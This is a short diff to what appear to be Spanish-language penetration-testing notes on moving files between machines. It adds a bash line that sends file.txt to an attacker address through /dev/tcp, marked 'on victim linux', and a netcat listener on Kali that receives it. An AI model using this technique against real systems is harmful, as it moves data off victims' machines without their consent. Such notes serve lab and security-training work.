@@ -43,4 +43,10 @@ Luego en mi maquina
 ```bash
 base64 -d encodedfile.b64 > outputfile
 ```
-
+Otra Alternativa es
+```bash
+cat file.txt > /dev/tcp/192.168.1.23/4444 # on victim linux
+```
+```bash
+nc -lvp 4444 > file.txt # on Kali
+```
